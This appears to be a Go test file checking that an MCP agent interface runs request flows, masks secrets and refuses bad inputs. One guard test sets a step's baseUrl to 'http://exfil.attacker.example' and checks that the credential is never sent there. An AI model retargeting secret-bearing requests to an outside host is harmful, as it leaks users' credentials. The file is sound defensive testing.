package core

// Tests for the flow tier of the MCP agent interface.
//
// EVERY RUN HERE IS A REAL HTTP REQUEST to a local httptest.Server, for the
// reason mcp_run_test.go and flow_run_test.go both give: the tier exists to go
// through the app's own send path, and a fake transport would prove nothing
// about whether a step's overrides reached the wire, whether the environment's
// secret resolved inside LiteAPI, or whether what came back was masked on the
// way out.
//
// The secret is a long sentinel on purpose. mcpserver.MaskKnownSecretValues
// skips values shorter than 8 bytes, so a short one would make every masking
// assertion pass without measuring anything.

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/mutexdev/lite_api/internal/mcpserver"
	"github.com/mutexdev/lite_api/internal/types"
)

const mcpFlowSentinelToken = "MCP-FLOW-SENTINEL-API-TOKEN-VALUE"

// mcpFlowFixture is an App with a live target behind a realistic collection,
// reached through the same mcpBackend the MCP server calls.
type mcpFlowFixture struct {
	t            *testing.T
	app          *App
	backend      *mcpBackend
	server       *httptest.Server
	collectionID string
	lookupID     string
	createID     string
	activateID   string

	mu        sync.Mutex
	requests  []recordedMCPFlowRequest
	approvals []types.MCPApprovalRequest
}

type recordedMCPFlowRequest struct {
	path       string
	body       string
	authHeader string
}

func newMCPFlowFixture(t *testing.T) *mcpFlowFixture {
	t.Helper()
	fixture := &mcpFlowFixture{t: t}
	fixture.server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		fixture.mu.Lock()
		fixture.requests = append(fixture.requests, recordedMCPFlowRequest{
			path:       r.URL.Path,
			body:       string(body),
			authHeader: r.Header.Get("Authorization"),
		})
		fixture.mu.Unlock()

		w.Header().Set("Content-Type", "application/json")
		switch r.URL.Path {
		case "/graphql":
			_ = json.NewEncoder(w).Encode(map[string]any{
				"data": map[string]any{"store": map[string]any{"id": "store_42", "region": "apac"}},
			})
		case "/terminals":
			w.WriteHeader(http.StatusCreated)
			_ = json.NewEncoder(w).Encode(map[string]any{
				"terminal": map[string]any{"id": "term_7", "state": "created"},
			})
		default:
			// The Authorization header is ECHOED BACK deliberately: it is the
			// only way to measure both halves of rule 1 at once — that the
			// secret really did resolve inside LiteAPI and reach the server, and
			// that a flow which pulls it back out of the body hands the agent a
			// masked value.
			_ = json.NewEncoder(w).Encode(map[string]any{
				"activated": true,
				"echo":      r.Header.Get("Authorization"),
			})
		}
	}))
	t.Cleanup(fixture.server.Close)

	app := newAppForTest(t)
	if _, err := app.GetState(); err != nil {
		t.Fatalf("GetState: %v", err)
	}
	fixture.app = app
	fixture.backend = &mcpBackend{app: app}
	// The approval seam, as mcp_run_test.go installs it. A test that does NOT
	// install it is a test with no frontend to ask, which is the deny path.
	app.mcpApprovalEmit = func(request types.MCPApprovalRequest) {
		fixture.mu.Lock()
		fixture.approvals = append(fixture.approvals, request)
		fixture.mu.Unlock()
	}

	app.mu.Lock()
	workspace := &app.state.Workspaces[0]
	collection := &workspace.Collections[0]

	lookup := types.NewRequestItem("Store lookup", "http", len(collection.Items)+1)
	lookup.Method = http.MethodPost
	lookup.URL = "{{baseUrl}}/graphql"
	lookup.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
	lookup.Body = types.RequestBody{Mode: "json", JSON: `{"code":"{{code}}"}`}
	collection.Items = append(collection.Items, lookup)

	create := types.NewRequestItem("Create terminal", "http", len(collection.Items)+1)
	create.Method = http.MethodPost
	create.URL = "{{baseUrl}}/terminals"
	create.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
	create.Body = types.RequestBody{Mode: "json", JSON: `{"storeId":"{{storeId}}"}`}
	collection.Items = append(collection.Items, create)

	activate := types.NewRequestItem("Activate terminal", "http", len(collection.Items)+1)
	activate.Method = http.MethodPost
	activate.URL = "{{baseUrl}}/activate"
	activate.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
	activate.Body = types.RequestBody{Mode: "json", JSON: `{"terminalId":"{{terminalId}}"}`}
	collection.Items = append(collection.Items, activate)

	workspace.GlobalEnvironments = append(workspace.GlobalEnvironments, Environment{
		ID:   "env-mcp-flow-global",
		Name: "MCP Flow Global",
		Variables: []Variable{
			{ID: "mcp-flow-var-base", Name: "baseUrl", Value: fixture.server.URL, Enabled: true},
			{ID: "mcp-flow-var-token", Name: "apiToken", Value: mcpFlowSentinelToken, Enabled: true, Secret: true},
		},
	})
	workspace.ActiveGlobalEnvironmentID = "env-mcp-flow-global"

	fixture.collectionID = collection.ID
	fixture.lookupID = lookup.ID
	fixture.createID = create.ID
	fixture.activateID = activate.ID
	app.mu.Unlock()

	return fixture
}

// provisionFlow is the document's canonical chain, wired to the fixture's ids.
// Step 1's var carries a {{template}} that flow scope DOES resolve (an input),
// and a second one it never resolves (the environment's secret) — the pair that
// makes get_flow's "nothing is resolved here" claim measurable.
func (f *mcpFlowFixture) provisionFlow() types.Flow {
	return types.Flow{
		ID:          "flow_provision",
		Name:        "Provision POS terminal",
		Description: "lookup -> create -> activate",
		Inputs:      []types.FlowInput{{Name: "storeCode", Required: true, Description: "Store short code, e.g. DHK-04"}},
		Steps: []types.FlowStep{
			{
				ID:        "lookup",
				RequestID: f.lookupID,
				Vars:      map[string]string{"code": "{{storeCode}}", "token": "{{apiToken}}"},
				Extract: []types.FlowExtract{
					{Name: "storeId", From: "body", Path: "$.data.store.id"},
					{Name: "region", From: "body", Path: "$.data.store.region"},
				},
				Assert: []types.FlowAssert{{Type: "status", Equals: 200}},
			},
			{
				ID:        "createTerminal",
				RequestID: f.createID,
				Vars:      map[string]string{"storeId": "{{storeId}}"},
				Extract:   []types.FlowExtract{{Name: "terminalId", From: "body", Path: "$.terminal.id"}},
				Assert: []types.FlowAssert{
					{Type: "status", In: []int{200, 201}},
					{Type: "body", Path: "$.terminal.state", Equals: "created"},
				},
			},
			{
				ID:        "activate",
				RequestID: f.activateID,
				Vars:      map[string]string{"terminalId": "{{terminalId}}"},
				Assert:    []types.FlowAssert{{Type: "status", Equals: 200}},
			},
		},
		Outputs: []types.FlowOutput{{Name: "terminalId", Value: "{{terminalId}}"}},
	}
}

// install puts a flow on the fixture's collection directly, so a test can plant
// a shape without going through the CRUD binding (and its disk write).
func (f *mcpFlowFixture) install(flow types.Flow) types.Flow {
	f.t.Helper()
	f.app.mu.Lock()
	defer f.app.mu.Unlock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	collection.Flows = append(collection.Flows, types.CloneFlow(flow))
	return flow
}

func (f *mcpFlowFixture) run(flowID string, inputs map[string]string) (mcpserver.FlowRunOutcome, error) {
	f.t.Helper()
	return f.backend.RunFlow(context.Background(), mcpserver.RunFlowParams{
		CollectionID: f.collectionID,
		FlowID:       flowID,
		Inputs:       inputs,
	})
}

func (f *mcpFlowFixture) recorded() []recordedMCPFlowRequest {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]recordedMCPFlowRequest{}, f.requests...)
}

// --- 1. the read tier --------------------------------------------------------

func TestMCPListFlowsReportsStepCountsAndDeclaredInputs(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())
	f.install(types.Flow{ID: "flow_smoke", Name: "Smoke", Steps: []types.FlowStep{{ID: "one", RequestID: f.lookupID}}})

	flows, err := f.backend.ListFlows(f.collectionID)
	if err != nil {
		t.Fatalf("ListFlows: %v", err)
	}
	if len(flows) != 2 {
		t.Fatalf("got %d flows, want 2: %+v", len(flows), flows)
	}
	if flows[0].ID != "flow_provision" || flows[0].Name != "Provision POS terminal" || flows[0].StepCount != 3 {
		t.Fatalf("summary lost fields: %+v", flows[0])
	}
	if len(flows[0].Inputs) != 1 || flows[0].Inputs[0].Name != "storeCode" || !flows[0].Inputs[0].Required {
		t.Fatalf("declared inputs did not reach the row: %+v", flows[0].Inputs)
	}
	if flows[0].Inputs[0].Description == "" {
		t.Error("the input's description was dropped; it is what tells an agent what to pass")
	}
	if flows[1].StepCount != 1 {
		t.Errorf("second flow stepCount = %d, want 1", flows[1].StepCount)
	}

	// list_collections is the doc's promised entry point for both kinds of
	// thing a collection holds, so its rows must count flows too.
	collections, err := f.backend.ListCollections()
	if err != nil {
		t.Fatalf("ListCollections: %v", err)
	}
	counted := false
	for _, row := range collections {
		if row.ID == f.collectionID {
			counted = true
			if row.FlowCount != 2 {
				t.Errorf("flowCount = %d, want 2", row.FlowCount)
			}
		}
	}
	if !counted {
		t.Error("the fixture collection did not appear in ListCollections at all")
	}
}

// The claim get_flow makes is that it resolves NOTHING. A step var naming the
// environment's secret must arrive as the literal braces — that is not a
// cosmetic choice: flow scope never resolves it either (flow_run.go), so the
// braces are the truth about what the step does.
func TestMCPGetFlowReturnsTheDefinitionWithTemplatesUnresolved(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())

	detail, err := f.backend.GetFlow(f.collectionID, "flow_provision")
	if err != nil {
		t.Fatalf("GetFlow: %v", err)
	}
	if detail.ID != "flow_provision" || detail.StepCount != 3 || len(detail.Steps) != 3 {
		t.Fatalf("detail lost fields: %+v", detail)
	}
	if got := detail.Steps[0].Vars["token"]; got != "{{apiToken}}" {
		t.Errorf("the step var naming the secret is %q, want the literal {{apiToken}} — nothing here may resolve", got)
	}
	if got := detail.Steps[0].Vars["code"]; got != "{{storeCode}}" {
		t.Errorf("the step var naming an input is %q, want the literal {{storeCode}}", got)
	}
	if detail.Steps[0].RequestID != f.lookupID {
		t.Errorf("step requestId = %q, want the id get_request accepts", detail.Steps[0].RequestID)
	}
	if len(detail.Steps[0].Extract) != 2 || detail.Steps[0].Extract[0].Path != "$.data.store.id" {
		t.Errorf("extractions did not survive: %+v", detail.Steps[0].Extract)
	}
	if len(detail.Steps[1].Assert) != 2 || len(detail.Steps[1].Assert[0].In) != 2 {
		t.Errorf("assertions did not survive: %+v", detail.Steps[1].Assert)
	}
	if len(detail.Outputs) != 1 || detail.Outputs[0].Value != "{{terminalId}}" {
		t.Errorf("outputs did not survive: %+v", detail.Outputs)
	}

	// The sentinel sweep, mcp_backend_test.go's convention: the whole DTO is
	// marshalled and grepped, so a field added later that carries a resolved
	// value fails here rather than in review.
	encoded, err := json.Marshal(detail)
	if err != nil {
		t.Fatalf("marshal the detail: %v", err)
	}
	if strings.Contains(string(encoded), mcpFlowSentinelToken) {
		t.Fatalf("get_flow leaked the secret value: %s", encoded)
	}
}

// A flow returned by GetFlow must not alias state: the agent-facing copy is
// taken under the lock and cloned, so mutating it cannot reach the collection.
func TestMCPGetFlowReturnsACopyRatherThanAliasingState(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())

	detail, err := f.backend.GetFlow(f.collectionID, "flow_provision")
	if err != nil {
		t.Fatalf("GetFlow: %v", err)
	}
	detail.Steps[0].Vars["token"] = "mutated"

	again, err := f.backend.GetFlow(f.collectionID, "flow_provision")
	if err != nil {
		t.Fatalf("GetFlow (second): %v", err)
	}
	if again.Steps[0].Vars["token"] != "{{apiToken}}" {
		t.Fatalf("mutating the returned detail reached app state: %q", again.Steps[0].Vars["token"])
	}
}

func TestMCPFlowReadToolsNameTheIdAndTheFix(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())

	if _, err := f.backend.ListFlows("col_does_not_exist"); err == nil {
		t.Error("ListFlows accepted an unknown collection")
	} else if !strings.Contains(err.Error(), "col_does_not_exist") || !strings.Contains(err.Error(), "list_collections") {
		t.Errorf("error should name the id and the way out: %v", err)
	}

	if _, err := f.backend.GetFlow(f.collectionID, "flow_nope"); err == nil {
		t.Error("GetFlow accepted an unknown flow id")
	} else if !strings.Contains(err.Error(), "flow_nope") || !strings.Contains(err.Error(), "list_flows") {
		t.Errorf("error should name the id and the way out: %v", err)
	}

	if _, err := f.backend.GetFlow("", ""); err == nil {
		t.Error("GetFlow accepted empty ids")
	}
	if flows, err := f.backend.ListFlows(f.collectionID); err != nil || len(flows) == 0 {
		t.Fatalf("the negative cases above measure nothing if the positive one fails: %v %+v", err, flows)
	}
}

// --- 2. the run tier ---------------------------------------------------------

func TestMCPRunFlowChainsStepsThroughTheAppsOwnSendPath(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())

	outcome, err := f.run("flow_provision", map[string]string{"storeCode": "DHK-04"})
	if err != nil {
		t.Fatalf("RunFlow: %v", err)
	}
	if !outcome.OK {
		t.Fatalf("outcome.OK is false: %s\n%+v", outcome.Error, outcome.Steps)
	}
	if len(outcome.Steps) != 3 {
		t.Fatalf("ran %d steps, want 3: %+v", len(outcome.Steps), outcome.Steps)
	}
	if outcome.Steps[0].Extracted["storeId"] != "store_42" || outcome.Steps[1].Extracted["terminalId"] != "term_7" {
		t.Fatalf("extractions did not reach the agent: %+v", outcome.Steps)
	}
	if outcome.Steps[1].Status != http.StatusCreated {
		t.Errorf("step 2 status = %d, want 201", outcome.Steps[1].Status)
	}
	if len(outcome.Steps[1].Assertions) != 2 || !outcome.Steps[1].Assertions[1].OK {
		t.Errorf("assertion results did not reach the agent: %+v", outcome.Steps[1].Assertions)
	}
	if outcome.Outputs["terminalId"] != "term_7" {
		t.Errorf("declared outputs = %+v, want terminalId term_7", outcome.Outputs)
	}

	recorded := f.recorded()
	if len(recorded) != 3 {
		t.Fatalf("the target saw %d requests, want 3: %+v", len(recorded), recorded)
	}
	// The input reached step 1's body, step 1's extraction reached step 2's, and
	// step 2's reached step 3's — the chain, over the wire.
	if !strings.Contains(recorded[0].body, `"code":"DHK-04"`) {
		t.Errorf("step 1 body did not carry the input: %s", recorded[0].body)
	}
	if !strings.Contains(recorded[1].body, `"storeId":"store_42"`) {
		t.Errorf("step 2 body did not carry step 1's extraction: %s", recorded[1].body)
	}
	if !strings.Contains(recorded[2].body, `"terminalId":"term_7"`) {
		t.Errorf("step 3 body did not carry step 2's extraction: %s", recorded[2].body)
	}
	// The secret resolved at SEND time on every step, including the one whose
	// var mentions it — the negative control for the masking test below.
	for index, request := range recorded {
		if request.authHeader != "Bearer "+mcpFlowSentinelToken {
			t.Errorf("step %d sent Authorization %q; the secret did not resolve at send time", index+1, request.authHeader)
		}
	}

	encoded, err := json.Marshal(outcome)
	if err != nil {
		t.Fatalf("marshal the outcome: %v", err)
	}
	if strings.Contains(string(encoded), mcpFlowSentinelToken) {
		t.Fatalf("the run outcome leaked the secret value: %s", encoded)
	}
}

// THE FIELD THIS TIER EXISTS TO MASK. An extraction reads a value out of a live
// response body, and a server can echo the credential it was called with. The
// flow below extracts exactly that, so an unmasked value would arrive at the
// agent under a name nothing could flag.
func TestMCPRunFlowMasksAnExtractedValueThatIsTheSecret(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(types.Flow{
		ID:   "flow_echo",
		Name: "Echo the credential back",
		Steps: []types.FlowStep{{
			ID:        "echo",
			RequestID: f.activateID,
			Extract:   []types.FlowExtract{{Name: "echoed", From: "body", Path: "$.echo"}},
			Assert:    []types.FlowAssert{{Type: "status", Equals: 200}},
		}},
		Outputs: []types.FlowOutput{{Name: "echoed", Value: "{{echoed}}"}},
	})

	outcome, err := f.run("flow_echo", nil)
	if err != nil {
		t.Fatalf("RunFlow: %v", err)
	}
	if !outcome.OK {
		t.Fatalf("outcome.OK is false: %s", outcome.Error)
	}
	// The negative control: the server really did receive the resolved secret,
	// so what follows is masking rather than the credential never travelling.
	recorded := f.recorded()
	if len(recorded) != 1 || recorded[0].authHeader != "Bearer "+mcpFlowSentinelToken {
		t.Fatalf("the target did not receive the resolved secret: %+v", recorded)
	}

	echoed := outcome.Steps[0].Extracted["echoed"]
	if strings.Contains(echoed, mcpFlowSentinelToken) {
		t.Fatalf("the extracted value carried the secret verbatim: %q", echoed)
	}
	if !strings.Contains(echoed, mcpserver.MaskedValue) {
		t.Fatalf("the extracted value is %q, want the secret replaced by %s", echoed, mcpserver.MaskedValue)
	}
	// And the output built from it, which is one interpolation away.
	if output := outcome.Outputs["echoed"]; strings.Contains(output, mcpFlowSentinelToken) {
		t.Fatalf("the declared output carried the secret: %q", output)
	}
}

// An assertion detail quotes the value it actually found, and a step's error
// quotes the assertion — two more ways a body value reaches the agent.
func TestMCPRunFlowMasksAssertionDetailsAndStepErrors(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(types.Flow{
		ID:   "flow_echo_assert",
		Name: "Assert on the echoed credential",
		Steps: []types.FlowStep{{
			ID:        "echo",
			RequestID: f.activateID,
			Assert:    []types.FlowAssert{{Type: "body", Path: "$.echo", Equals: "something else"}},
		}},
	})

	outcome, err := f.run("flow_echo_assert", nil)
	if err != nil {
		t.Fatalf("RunFlow returned an error for a flow that ran and failed its own check: %v", err)
	}
	if outcome.OK {
		t.Fatal("the failing assertion was reported as a pass")
	}
	detail := outcome.Steps[0].Assertions[0].Detail
	if strings.Contains(detail, mcpFlowSentinelToken) {
		t.Errorf("the assertion detail quoted the secret: %q", detail)
	}
	if !strings.Contains(detail, mcpserver.MaskedValue) {
		t.Errorf("the assertion detail is %q, want the found value masked", detail)
	}
	if strings.Contains(outcome.Steps[0].Error, mcpFlowSentinelToken) {
		t.Errorf("the step error quoted the secret: %q", outcome.Steps[0].Error)
	}
	if strings.Contains(outcome.Error, mcpFlowSentinelToken) {
		t.Errorf("the run error quoted the secret: %q", outcome.Error)
	}
	// A flow that RAN and failed its checks is an ordinary outcome, not an
	// exception: the agent gets the report rather than an error to retry.
	if len(outcome.Steps) != 1 || outcome.Steps[0].Status != http.StatusOK {
		t.Errorf("the failing step's own result is missing: %+v", outcome.Steps)
	}
}

// An undeclared input is refused rather than ignored, and the refusal names the
// inputs the flow does declare — the agent is about to compose the retry.
func TestMCPRunFlowUndeclaredInputIsRefusedNamingTheDeclaredOnes(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())

	outcome, err := f.run("flow_provision", map[string]string{"storeCoden": "DHK-04"})
	if err == nil {
		t.Fatalf("an undeclared input was accepted: %+v", outcome)
	}
	if !strings.Contains(err.Error(), "storeCoden") || !strings.Contains(err.Error(), "storeCode") {
		t.Errorf("the refusal should name the input and the declared list: %v", err)
	}
	if len(outcome.Steps) != 0 {
		t.Errorf("a refused run reported steps: %+v", outcome.Steps)
	}
	if recorded := f.recorded(); len(recorded) != 0 {
		t.Fatalf("a refused run still sent %d requests: %+v", len(recorded), recorded)
	}
}

func TestMCPRunFlowMissingRequiredInputIsRefusedBeforeAnythingIsSent(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.install(f.provisionFlow())

	if _, err := f.run("flow_provision", nil); err == nil {
		t.Fatal("a flow with a required input ran without it")
	} else if !strings.Contains(err.Error(), "storeCode") {
		t.Errorf("the refusal does not name the missing input: %v", err)
	}
	if recorded := f.recorded(); len(recorded) != 0 {
		t.Fatalf("a refused run still sent %d requests", len(recorded))
	}
}

// --- 3. the guard, per step --------------------------------------------------

// THE EXFILTRATION SHAPE, one layer up from run_request's. A flow step's vars
// can retarget {{baseUrl}} exactly as a run override can, and a guard that ran
// once for the flow would have cleared it on step 1's host. This test denies at
// step 2 with no frontend installed — "nobody was there to say no" is not
// consent — and measures that step 1 still reports what it did.
func TestMCPRunFlowGuardDeniesAStepThatRetargetsASecret(t *testing.T) {
	f := newMCPFlowFixture(t)
	// No approval seam: this app has no window, so requestMCPApproval denies.
	f.app.mcpApprovalEmit = nil

	f.install(types.Flow{
		ID:   "flow_retarget",
		Name: "Retarget the credential at step 2",
		Steps: []types.FlowStep{
			{
				ID:        "lookup",
				RequestID: f.lookupID,
				Extract:   []types.FlowExtract{{Name: "storeId", From: "body", Path: "$.data.store.id"}},
				Assert:    []types.FlowAssert{{Type: "status", Equals: 200}},
			},
			{
				ID:        "createTerminal",
				RequestID: f.createID,
				Vars:      map[string]string{"baseUrl": "http://exfil.attacker.example"},
			},
		},
	})

	outcome, err := f.run("flow_retarget", nil)
	if err == nil {
		t.Fatalf("the retargeted step was allowed to run: %+v", outcome)
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Fatalf("error is %v, want one that errors.Is(ErrDenied) so the audit records a denial", err)
	}
	// THE DENIAL NAMES THE DESTINATION, NOT THE CREDENTIAL, and that is the
	// boundary's shape rather than a loss. Base(S, k) knows nothing about
	// secrets (§1.2(1)): this step is refused because its origin is not in its
	// own request's Base, and it would be refused identically if it carried no
	// credential at all. Which secret happens to be travelling survives only as
	// the prompt's advisory list (§6).
	if !strings.Contains(err.Error(), "exfil.attacker.example") {
		t.Errorf("the denial should name the origin it refused: %v", err)
	}
	if strings.Contains(err.Error(), mcpFlowSentinelToken) {
		t.Fatalf("the denial carried the secret VALUE: %v", err)
	}

	// Step 1 ran and is reported; step 2 is reported as the denial; step 3 does
	// not exist because the flow stopped.
	if len(outcome.Steps) != 2 {
		t.Fatalf("the outcome reports %d steps, want 2 (the one that ran and the one that was refused): %+v", len(outcome.Steps), outcome.Steps)
	}
	if outcome.Steps[0].Error != "" || outcome.Steps[0].Extracted["storeId"] != "store_42" {
		t.Errorf("step 1's own result was lost: %+v", outcome.Steps[0])
	}
	if !strings.Contains(outcome.Steps[1].Error, "exfil.attacker.example") {
		t.Errorf("step 2 does not report the denial: %+v", outcome.Steps[1])
	}
	if outcome.OK {
		t.Error("a denied flow reported ok")
	}

	// The request was never sent: exactly one call reached the target, step 1's.
	recorded := f.recorded()
	if len(recorded) != 1 || recorded[0].path != "/graphql" {
		t.Fatalf("the target saw %+v; the retargeted step must never have been sent", recorded)
	}
}

// The guard is not a blanket refusal of every flow: a step aimed at a host the
// collection already sends this secret to runs, which is what makes the test
// above a measurement of the guard rather than of flows being broken.
func TestMCPRunFlowAllowsStepsAimedAtKnownHosts(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.app.mcpApprovalEmit = nil

	outcome, err := f.run(f.install(f.provisionFlow()).ID, map[string]string{"storeCode": "DHK-04"})
	if err != nil {
		t.Fatalf("a flow against the collection's own host was refused: %v", err)
	}
	if !outcome.OK {
		t.Fatalf("outcome.OK is false: %s", outcome.Error)
	}
}
